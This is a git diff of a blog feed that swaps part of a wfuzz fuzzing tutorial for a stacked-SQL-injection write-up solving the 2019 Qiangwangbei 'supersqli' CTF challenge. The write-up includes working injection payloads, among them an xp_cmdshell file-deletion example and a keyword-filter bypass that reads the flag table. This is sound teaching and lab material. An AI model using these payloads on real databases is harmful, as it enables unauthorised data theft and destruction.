+&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;master&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DEL important_file.txt'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;用户恶意输入&lt;/span&gt;
 
-000000004:   404        828 L    1806 W   36850 Ch    &quot;4&quot;                                                
-000000001:   404        828 L    1806 W   36850 Ch    &quot;1&quot;                                                
-000000002:   404        828 L    1806 W   36850 Ch    &quot;2&quot;                                                
-000000003:   404        828 L    1806 W   36849 Ch    &quot;3&quot;                                                
-000000006:   404        828 L    1806 W   36868 Ch    &quot;saf&quot;                                              
-000000005:   404        828 L    1806 W   36859 Ch    &quot;ad&quot;                                               
-000000007:   404        828 L    1806 W   36868 Ch    &quot;zxs&quot;                                              
-
-Total time: 1.044162
-Processed Requests: 7
-Filtered Requests: 0
-Requests/sec.: 6.703940
+&lt;span class=&quot;k&quot;&gt;GENERATED&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUERY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;categoryid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;master&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DEL important_file.txt'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;构成的恶意语句&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;为了不再重复扫描相同的请求（具有相同的参数），有一个缓存，可以使用–no-cache标志禁用缓存&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;The query above will return a product list and delete “important_file.txt”. A much more complex attack could have been launched to take control over the operating system, but this is outside the scope of this article. The injected statement is not limited to built-in packages; a user-defined procedure could also be called. This approach is not frequent but it could be useful in some specific cases.&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;p&gt;例如，如果我们以具有相同URL但参数值不同的Web服务器为目标，则会得到&lt;/p&gt;
+&lt;p&gt;以上查询会返回&lt;code class=&quot;highlighter-rouge&quot;&gt;categoryid=1&lt;/code&gt;的产品列表，并删除&lt;code class=&quot;highlighter-rouge&quot;&gt;important_file.txt&lt;/code&gt;，更复杂的攻击可能会获得操作系统的控制，但是这超出了这篇文章的范围。注入语句也不限于内置的包，用户自定义的程序也可能被利用执行，这个攻击方法不是很普适但在某些特殊情况下是有用的。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range --zD 0-3 -z list --zD &quot;'&quot; -u http://testphp.vulnweb.com/artists.php?artist=FUZZFUZ2Z -A
+&lt;h1 id=&quot;ein-beispiel&quot;&gt;Ein Beispiel&lt;/h1&gt;
 
-000000004:   0.195s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;3 - '&quot;
-|_  Error identified: Warning: mysql_fetch_array()
-000000001:   0.198s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;0 - '&quot;
-000000002:   0.198s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;1 - '&quot;
-000000003:   0.198s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;2 - '&quot;
+&lt;p&gt;一个例子来自强网杯2019，&lt;a href=&quot;https://github.com/CTFTraining/qwb_2019_supersqli&quot;&gt;复现环境&lt;/a&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;clone&lt;/code&gt;放到&lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;里，启动&lt;code class=&quot;highlighter-rouge&quot;&gt;docker&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;输入一个小小的单引号&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/2.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;报错了，说明可能存在SQL注入漏洞&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1' or '1'='1 #
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;相同操作，禁用了缓存&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/3.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range --zD 0-3 -z list --zD &quot;'&quot; -u http://testphp.vulnweb.com/artists.php?artist=FUZZFUZ2Z -A --no-cache
+&lt;p&gt;返回了一些数据，说明存在SQL注入漏洞无疑&lt;/p&gt;
 
-000000004:   1.170s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;3 - '&quot;
-|_  Error identified: Warning: mysql_fetch_array()
-000000002:   1.173s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;1 - '&quot;
-|_  Error identified: Warning: mysql_fetch_array()
-000000001:   1.174s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;0 - '&quot;
-|_  Error identified: Warning: mysql_fetch_array()
-000000003:   1.173s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;2 - '&quot;
-|_  Error identified: Warning: mysql_fetch_array()
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1' order by 3 # 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;自定义脚本&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;返回错误&lt;/p&gt;
 
-&lt;p&gt;如果要创建脚本，需要在“ .wfuzz”目录下创建一个名为“ scripts”的目录，将脚本放入目录下&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/xmendez/wfuzz/tree/master/src/wfuzz/plugins/scripts&quot;&gt;参考如何编写插件&lt;/a&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;加密encoders&quot;&gt;加密(encoders)&lt;/h1&gt;
-
-&lt;p&gt;&lt;strong&gt;具体说明&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e encoders
-
-Available encoders:
-
-  Category      | Name              | Summary                                                                           
------------------------------------------------------------------------------------------
-  hashes        | base64            | Encodes the given string using base64                                             
-  url           | doble_nibble_hex  | Replaces ALL characters in string using the %%dd%dd escape                        
-  url_safe, url | double urlencode  | Applies a double encode to special characters in string using the %25xx escape.   
-                |                   | Letters, digits, and the characters '_.-' are never quoted.                       
-  url           | first_nibble_hex  | Replaces ALL characters in string using the %%dd? escape                          
-  default       | hexlify           | Every byte of data is converted into the corresponding 2-digit hex representatio  
-                |                   | n.                                                                                
-  html          | html_decimal      | Replaces ALL characters in string using the &amp;amp;#dd; escape                          
-  html          | html_escape       | Convert the characters &amp;amp;&amp;lt;&amp;gt;&quot; in string to HTML-safe sequences.                     
-  html          | html_hexadecimal  | Replaces ALL characters in string using the &amp;amp;#xx; escape                          
-  hashes        | md5               | Applies a md5 hash to the given string                                            
-  db            | mssql_char        | Converts ALL characters to MsSQL's char(xx)                                       
-  db            | mysql_char        | Converts ALL characters to MySQL's char(xx)                                       
-  default       | none              | Returns string without changes                                                    
-  db            | oracle_char       | Converts ALL characters to Oracle's chr(xx)                                       
-  default       | random_upper      | Replaces random characters in string with its capitals letters                    
-  url           | second_nibble_hex | Replaces ALL characters in string using the %?%dd escape                          
-  hashes        | sha1              | Applies a sha1 hash to the given string                                           
-  url           | uri_double_hex    | Encodes ALL charachers using the %25xx escape.                                    
-  url           | uri_hex           | Encodes ALL charachers using the %xx escape.                                      
-  url           | uri_triple_hex    | Encodes ALL charachers using the %25%xx%xx escape.                                
-  url           | uri_unicode       | Replaces ALL characters in string using the %u00xx escape                         
-  url_safe, url | urlencode         | Replace special characters in string using the %xx escape. Letters, digits, and   
-                |                   | the characters '_.-' are never quoted.                                            
-  url           | utf8              | Replaces ALL characters in string using the \u00xx escape                         
-  url           | utf8_binary       | Replaces ALL characters in string using the \uxx escape
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1' order by 2 # 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;encoders&lt;/code&gt;的作用是将payload进行编码或加密&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/4.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;使用方法&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;返回正确，可以判断该表有两列&lt;/p&gt;
 
-&lt;p&gt;在字典后面直接加加密方式就可以了&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w wordlist.txt,md5 http://172.16.70.163/FUZZ
-
-********************************************************
-* Wfuzz 2.4 - The Web Fuzzer                           *
-********************************************************
-
-Target: http://172.16.70.163/FUZZ
-Total requests: 7
-
-===================================================================
-ID           Response   Lines    Word     Chars       Payload                                            
-===================================================================
-
-000000001:   404        828 L    1810 W   37237 Ch    &quot;c4ca4238a0b923820dcc509a6f75849b&quot;                 
-000000002:   404        828 L    1810 W   37237 Ch    &quot;c81e728d9d4c2f636f067f89cc14862c&quot;                 
-000000003:   404        828 L    1810 W   37237 Ch    &quot;eccbc87e4b5ce2fe28308fd9f2a7baf3&quot;                 
-000000004:   404        828 L    1810 W   37237 Ch    &quot;a87ff679a2f3e71d9181a67b7542122c&quot;                 
-000000005:   404        828 L    1810 W   37237 Ch    &quot;523af537946b79c4f8369ed39ba78605&quot;                 
-000000006:   404        828 L    1810 W   37237 Ch    &quot;e8a88bb6f4d420a8517965d25cd54a14&quot;                 
-000000007:   404        828 L    1810 W   37237 Ch    &quot;68f43f44054de89e6ee5ff03adb26542&quot;                 
-
-Total time: 0.239509
-Processed Requests: 7
-Filtered Requests: 0
-Requests/sec.: 29.22638
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1' union select 1,2 #
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;使用多个encoder&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/5.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;多个encoder，使用一个&lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;号分隔的列表来指定&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;select&lt;/code&gt;关键词被过滤了，加&lt;code class=&quot;highlighter-rouge&quot;&gt;/**/&lt;/code&gt;，替换大小写都不能绕过去。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -w wordlist.txt,md5-base64 http://172.16.70.163/FUZZ
+&lt;p&gt;这时尝试堆叠注入，尝试列出所有数据库：&lt;/p&gt;
 
-********************************************************
-* Wfuzz 2.4 - The Web Fuzzer                           *
-********************************************************
-
-Target: http://172.16.70.163/FUZZ
-Total requests: 14
-
-===================================================================
-ID           Response   Lines    Word     Chars       Payload                                            
-===================================================================
-
-000000001:   404        828 L    1810 W   37237 Ch    &quot;c4ca4238a0b923820dcc509a6f75849b&quot;                 
-000000002:   404        828 L    1807 W   36876 Ch    &quot;MQ==&quot;                                             
-000000003:   404        828 L    1810 W   37237 Ch    &quot;c81e728d9d4c2f636f067f89cc14862c&quot;                 
-000000004:   404        828 L    1807 W   36876 Ch    &quot;Mg==&quot;                                             
-000000005:   404        828 L    1810 W   37237 Ch    &quot;eccbc87e4b5ce2fe28308fd9f2a7baf3&quot;                 
-000000006:   404        828 L    1807 W   36876 Ch    &quot;Mw==&quot;                                             
-000000007:   404        828 L    1810 W   37237 Ch    &quot;a87ff679a2f3e71d9181a67b7542122c&quot;                 
-000000008:   404        828 L    1807 W   36876 Ch    &quot;NA==&quot;                                             
-000000009:   404        828 L    1810 W   37237 Ch    &quot;523af537946b79c4f8369ed39ba78605&quot;                 
-000000013:   404        828 L    1810 W   37237 Ch    &quot;68f43f44054de89e6ee5ff03adb26542&quot;                 
-000000010:   404        828 L    1806 W   36876 Ch    &quot;YWQ=&quot;                                             
-000000011:   404        828 L    1810 W   37236 Ch    &quot;e8a88bb6f4d420a8517965d25cd54a14&quot;                 
-000000012:   404        828 L    1806 W   36877 Ch    &quot;c2Fm&quot;                                             
-000000014:   404        828 L    1806 W   36877 Ch    &quot;enhz&quot;                                             
-
-Total time: 0.266457
-Processed Requests: 14
-Filtered Requests: 0
-Requests/sec.: 52.54129
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1';show databases; #
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;多次encoder&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/6.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;多次encoder，使用一个&lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt;号分隔的列表来指定，顺序为由右到左&lt;/p&gt;
+&lt;p&gt;有&lt;code class=&quot;highlighter-rouge&quot;&gt;ctftraining&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;information_schema&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;mysql&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;performance_schema&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;supersqli&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt;6个数据库&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w wordlist.txt,md5@base64 http://172.16.70.163/FUZZ
+&lt;p&gt;尝试列出当前数据库的表：&lt;/p&gt;
 
-Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1';show tables; #
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named 'shodan'
-libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named 'shodan'
-********************************************************
-* Wfuzz 2.4 - The Web Fuzzer                           *
-********************************************************
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/7.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
 
-Target: http://172.16.70.163/FUZZ
-Total requests: 7
+&lt;p&gt;有&lt;code class=&quot;highlighter-rouge&quot;&gt;1919810931114514&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;words&lt;/code&gt;两个表。&lt;/p&gt;
 
-===================================================================
-ID           Response   Lines    Word     Chars       Payload                                            
-===================================================================
+&lt;p&gt;尝试获取表的列名：&lt;/p&gt;
 
-000000003:   404        828 L    1810 W   37237 Ch    &quot;0b24df25fe628797b3a50ae0724d2730&quot;                 
-000000006:   404        828 L    1810 W   37237 Ch    &quot;461194a350fdac0ef28e8b2073f34a6a&quot;                 
-000000001:   404        828 L    1810 W   37237 Ch    &quot;cdd96d3cc73d1dbdaffa03cc6cd7339b&quot;                 
-000000002:   404        828 L    1810 W   37235 Ch    &quot;0b7e7dee87b1c3b98e72131173dfbbbf&quot;                 
-000000004:   404        828 L    1810 W   37237 Ch    &quot;f7947d50da7a043693a592b4db43b0a1&quot;                 
-000000005:   404        828 L    1810 W   37237 Ch    &quot;5fae8a76529cf25432da8e49f1053e08&quot;                 
-000000007:   404        828 L    1810 W   37237 Ch    &quot;4094c4aed3ced5fbd69159b16af12b7b&quot;                 
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1';show columns from words;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-Total time: 1.048273
-Processed Requests: 7
-Filtered Requests: 0
-Requests/sec.: 6.677649
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>true</name></author><category term="fuzz" /><summary type="html">🤺基础用法请看上一篇</summary></entry><entry><title type="html">Wfuzz的其他模块</title><link href="http://localhost:4000/blog/wfuzz1/" rel="alternate" type="text/html" title="Wfuzz的其他模块" /><published>2020-04-02T17:08:36+08:00</published><updated>2020-04-02T17:08:36+08:00</updated><id>http://localhost:4000/blog/wfuzz1</id><content type="html" xml:base="http://localhost:4000/blog/wfuzz1/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/9.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1';show columns from `1919810931114514`;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/8.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接下来就要读取数据了，但是关键词都被过滤了。&lt;/p&gt;
+
+&lt;p&gt;看到两种解题思路，一种是把关键词分开写然后拼接，一种是将1919810931114514重命名为words，将flag改为id。感觉重命名了以后就算是修改了原本数据，所以选择拼接关键词的方法。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/10.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;思路&quot;&gt;思路&lt;/h2&gt;
+
+&lt;p&gt;💁加单引号试探，有时候也可以试一下没有单引号或者括号或者双引号，原理就是尝试闭合前一个语句&lt;/p&gt;
+
+&lt;p&gt;💁判断列数，&lt;code class=&quot;highlighter-rouge&quot;&gt;order by&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;💁select 列数，发现关键字被过滤，尝试堆叠注入&lt;/p&gt;
+
+&lt;p&gt;💁列出数据库名&lt;/p&gt;
+
+&lt;p&gt;💁列出表名&lt;/p&gt;
+
+&lt;p&gt;💁列出列名&lt;/p&gt;
+
+&lt;p&gt;💁想办法读数据，这里的操作是关键词绕过&lt;/p&gt;
+
+&lt;h1 id=&quot;refer&quot;&gt;Refer&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;www.wuliao.com&quot;&gt;https://xz.aliyun.com/t/5505&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;www.shibushisha.com&quot;&gt;https://www.zhaoj.in/read-5873.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;www.hahahaha.com&quot;&gt;https://www.cnblogs.com/0nth3way/articles/7128189.html&lt;/a&gt;&lt;/p&gt;</content><author><name>true</name></author><category term="SQL注入" /><summary type="html">堆叠注入🤒</summary></entry><entry><title type="html">Wfuzz的其他模块</title><link href="http://localhost:4000/blog/wfuzz1/" rel="alternate" type="text/html" title="Wfuzz的其他模块" /><published>2020-04-02T17:08:36+08:00</published><updated>2020-04-02T17:08:36+08:00</updated><id>http://localhost:4000/blog/wfuzz1</id><content type="html" xml:base="http://localhost:4000/blog/wfuzz1/">&lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#迭代器iterators&quot; id=&quot;markdown-toc-迭代器iterators&quot;&gt;迭代器(iterators)&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#脚本scripts&quot; id=&quot;markdown-toc-脚本scripts&quot;&gt;脚本(scripts)&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#加密encoders&quot; id=&quot;markdown-toc-加密encoders&quot;&gt;加密(encoders)&lt;/a&gt;&lt;/li&gt;
@@ -492,7 +341,7 @@ Requests/sec.: 79.04683
 
 &lt;p&gt;&lt;strong&gt;product&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;需要两个字典，两个占位符FUZZ，&lt;code class=&quot;highlighter-rouge&quot;&gt;product&lt;/code&gt;可以排列组合两个字典，按顺序传入占位符，一共&lt;code class=&quot;highlighter-rouge&quot;&gt;n*m&lt;/code&gt;条payloads&lt;/p&gt;
+&lt;p&gt;需要两个字典，两个占位符FUZZ和FUZ2Z，&lt;code class=&quot;highlighter-rouge&quot;&gt;product&lt;/code&gt;可以排列组合两个字典，按顺序传入占位符，一共&lt;code class=&quot;highlighter-rouge&quot;&gt;n*m&lt;/code&gt;条payloads&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range,0-3 -w Deutsch.txt -m product http://172.16.70.163/FUZZ=FUZ2Z
 
@@ -532,7 +381,7 @@ Requests/sec.: 77.29370
 
 &lt;p&gt;&lt;strong&gt;zip&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;需要两个字典，两个个占位符FUZZ和FU2Z，&lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt;可以两个字典一一对应，按顺序传入两个占位符，如果两个字典行数不相等则取行数少的，所以一共&lt;code class=&quot;highlighter-rouge&quot;&gt;min(n,m)&lt;/code&gt;条payloads&lt;/p&gt;
+&lt;p&gt;需要两个字典，两个个占位符FUZZ和FUZ2Z，&lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt;可以两个字典一一对应，按顺序传入两个占位符，如果两个字典行数不相等则取行数少的，所以一共&lt;code class=&quot;highlighter-rouge&quot;&gt;min(n,m)&lt;/code&gt;条payloads&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range,0-10 -w Deutsch.txt -m zip http://172.16.70.163/FUZZ=FUZ2Z
 
